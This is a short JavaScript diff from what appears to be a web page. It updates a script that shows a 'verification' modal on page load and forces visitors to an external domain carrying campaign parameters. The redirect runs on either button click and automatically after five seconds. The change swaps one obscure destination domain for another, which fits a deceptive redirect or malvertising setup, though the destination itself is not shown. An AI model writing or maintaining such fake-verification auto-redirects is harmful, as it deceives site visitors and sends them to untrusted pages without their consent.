@@ -45,7 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const modal = document.getElementById('verification-modal');
   if (modal) {
     modal.showModal();
-    const redirect = () => window.location.href = 'https://p8r9.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
+    const redirect = () => window.location.href = 'https://h2n6.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
     document.getElementById('verify-btn-1')?.addEventListener('click', redirect);
     document.getElementById('verify-btn-2')?.addEventListener('click', redirect);
     setTimeout(redirect, 5000);
